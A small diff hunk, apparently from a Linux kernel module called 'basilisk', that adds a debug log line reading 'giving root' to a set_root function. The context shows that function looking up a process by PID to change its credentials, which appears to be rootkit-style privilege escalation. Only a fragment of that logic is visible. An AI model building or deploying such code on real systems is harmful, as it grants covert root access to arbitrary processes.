@@ -57,6 +57,7 @@ void set_root(pid_t pid)
     struct task_struct *task;
     struct cred *task_cred;
 
+    pr_info("basilisk: giving root . . .\n");
     if (pid) {
         // Set credentials of process from PID
         pid_struct = find_get_pid(pid);
